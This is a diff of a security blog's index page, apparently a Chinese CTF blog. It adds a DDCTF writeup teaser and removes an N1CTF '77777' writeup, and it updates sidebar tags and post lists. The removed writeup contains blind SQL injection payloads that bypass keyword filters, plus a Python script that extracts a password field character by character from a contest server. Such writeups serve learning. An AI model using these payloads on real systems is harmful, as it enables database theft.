@@ -140,6 +140,54 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-04-20T14:47:56.000Z">2018-04-20</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    17 分钟 读完 (大约 2493 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/04/ddctf-writeup2/">2018 DDCTF Web 部分writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;滴滴的web题感觉质量还是挺高的，因为每一道题自己做得都比较吃力（菜鸟自白）。。。但更重要的是自己也从每道题中学习到了新知识，这种感觉甚至胜过拿到flag的喜悦…..<br></p>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2018/04/ddctf-writeup2/#more">阅读更多</a>
+                </div>
+            </div>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-04-06T14:47:56.000Z">2018-04-06</time>
                 
                 
@@ -736,66 +784,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    5 分钟 读完 (大约 772 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/03/n1ctf-writeup/">N1CTF 77777 writeup</a>
-            
-        </h1>
-        <div class="content">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是我及我所在的团队第一次参加<code>正式</code>的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责<code>web</code>方向，比赛中的成果就是两道<code>77777</code>。</p>
-<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>&emsp;&emsp;题目描述：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/1.png"><br></div></p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/2.png"><br></div><br>&emsp;&emsp;这道题最坑的就是一开始<code>没有判断出是否注入成功的依据</code>，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入<code>没有隔离开</code>，造成即使注入成功也可能被别的队刷走，从而影响判断。</p>
-<p>&emsp;&emsp;又因为它是<code>sptintf(&quot;xxx%d%s&quot;)</code>，所以注入应该在<code>str</code>的地方，也就是在<code>hi</code>中进行注入，payload：<code>hi=000 where ord(substr(password, 1, 1))&gt;100</code>，因为是在<code>update users set</code>中注入，所以这里不需要再使用<code>union,select</code>等方法了。完整的payload如下图：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/3.png"><br></div><br>&emsp;&emsp;如果注入成功，则会返回你的<code>flag</code>字段，如：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/4.png"><br></div><br>&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。</p>
-<h3 id="77777-2"><a href="#77777-2" class="headerlink" title="77777 2"></a>77777 2</h3><p>&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对<code>hi</code>进行了更严格的过滤，上一道的payload就无效了。</p>
-<p>&emsp;&emsp;这道题过滤了<code>and or || &amp; &amp;&amp;</code>（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉<code>|</code>。所以我们可以选择<code>|</code>进行<code>位注入</code>。然后在检测一下，没有被过滤的是：<code>substr select from if</code>，所以考虑用<code>if</code>替代<code>where</code>进行判断。</p>
-<p>&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：<code>hi=000 |  IF (substr((select substr( pw from 1)),1,1)&gt;&#39;z&#39;,1,0)</code>，这里<code>( pw</code>中间一定要有<code>空格</code>，不然无法绕过。另一个要说的就是<code>pw from 1</code>，它会返回<code>pw字段从1开始的所有值</code>。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pw = &apos;flag&#123;123456&#125;&apos;</span><br><span class="line">pw from 1 ---&gt; flag&#123;123456&#125;</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;payload：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/5.png"><br></div><br>&emsp;&emsp;判断的依据是返回的数字的最后一位，如：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/6.png"><br></div><br>&emsp;&emsp;如果是返回错误则是如下：</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/7.png"><br></div></p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/8.png"><br></div></p>
-<blockquote>
-<p>另一个tips就是数字的后一位一定要<code>0</code>，不然如果是<code>1</code>的话就无法判断了。<code>1 |</code>任何也是真。</p>
-</blockquote>
-<p>&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。</p>
-<p><div align="center"><br>    <img src="/images/posts/n1ctf/9.png"><br></div><br>&emsp;&emsp;如上，逐位比较的时候使用<code>+1</code>的方法，如果直接用2,3,4,…的话有些数字<code>会被过滤</code>，还有就是有些字符也会被过滤，但无关flag字段。<br>&emsp;&emsp;附上脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    lc = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="hljs-string">'+1'</span></span><br><span class="line">    lc = lc[<span class="hljs-number">1</span>:]</span><br><span class="line">    sql = <span class="hljs-string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="hljs-string">'flag'</span>: <span class="hljs-number">123</span>,</span><br><span class="line">            <span class="hljs-string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="hljs-comment"># print(text)</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'123000'</span> <span class="hljs-keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
 
     
 <div class="card card-transparent">
@@ -865,7 +853,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        64
+                        65
                     </p>
                 </div>
             </div>
@@ -885,7 +873,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        24
+                        25
                     </p>
                 </div>
             </div>
@@ -980,7 +968,7 @@
         <h3 class="menu-label">
             标签云
         </h3>
-        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 13.33px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+        <a href="/tags/BROP/" style="font-size: 10px;">BROP</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwm/" style="font-size: 10px;">pwm</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/ret2dl-resolve/" style="font-size: 16.67px;">ret2dl_resolve</a> <a href="/tags/rop/" style="font-size: 10px;">rop</a> <a href="/tags/seccomp/" style="font-size: 10px;">seccomp</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
     </div>
 </div>
 
@@ -994,6 +982,25 @@
         <h3 class="menu-label">
             最新文章
         </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/dl_resolve_seccomp/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve to bypass seccomp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-21T16:00:00.000Z">2019-03-22</time></div>
+                    <a href="/2019/03/dl_resolve_seccomp/" class="has-link-black-ter is-size-6">ret2dl_resolve to bypass seccomp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1071,25 +1078,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/rop-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="x86 ROP study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-03T14:05:56.000Z">2018-12-03</time></div>
-                    <a href="/2018/12/rop-study/" class="has-link-black-ter is-size-6">x86 ROP study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1108,7 +1096,7 @@
                     <span class="level-item">三月 2019</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1297,7 +1285,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">19</span>
+                            <span class="level-item tag">20</span>
                         </span>
                     </a>
                 </li>
@@ -1418,7 +1406,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">2</span>
+                            <span class="level-item tag">3</span>
                         </span>
                     </a>
                 </li>
@@ -1427,6 +1415,17 @@
                     <a class="level is-marginless" href="/tags/rop/">
                         <span class="level-start">
                             <span class="level-item">rop</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/seccomp/">
+                        <span class="level-start">
+                            <span class="level-item">seccomp</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
@@ -1557,6 +1556,25 @@
         
         <article class="media">
             
+            <a href="/2019/03/dl_resolve_seccomp/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve to bypass seccomp">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-21T16:00:00.000Z">2019-03-22</time></div>
+                    <a href="/2019/03/dl_resolve_seccomp/" class="has-link-black-ter is-size-6">ret2dl_resolve to bypass seccomp</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
             <a href="/2019/03/ret2dl_resolve_x64/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="/images/thumbnail.svg" alt="ret2dl_resolve x64 study">
@@ -1631,25 +1649,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/2018/12/rop-study/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="x86 ROP study">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-03T14:05:56.000Z">2018-12-03</time></div>
-                    <a href="/2018/12/rop-study/" class="has-link-black-ter is-size-6">x86 ROP study</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
 
@@ -1668,7 +1667,7 @@
                     <span class="level-item">三月 2019</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1857,7 +1856,7 @@
                             <span class="level-item">CTF</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">19</span>
+                            <span class="level-item tag">20</span>
                         </span>
                     </a>
                 </li>
@@ -1978,7 +1977,7 @@
                             <span class="level-item">ret2dl_resolve</span>
                         </span>
                         <span class="level-end">
-                            <span class="level-item tag">2</span>
+                            <span class="level-item tag">3</span>
                         </span>
                     </a>
                 </li>
@@ -1987,6 +1986,17 @@
                     <a class="level is-marginless" href="/tags/rop/">
                         <span class="level-start">
                             <span class="level-item">rop</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/seccomp/">
+                        <span class="level-start">
+                            <span class="level-item">seccomp</span>
                         </span>
                         <span class="level-end">
                             <span class="level-item tag">1</span>
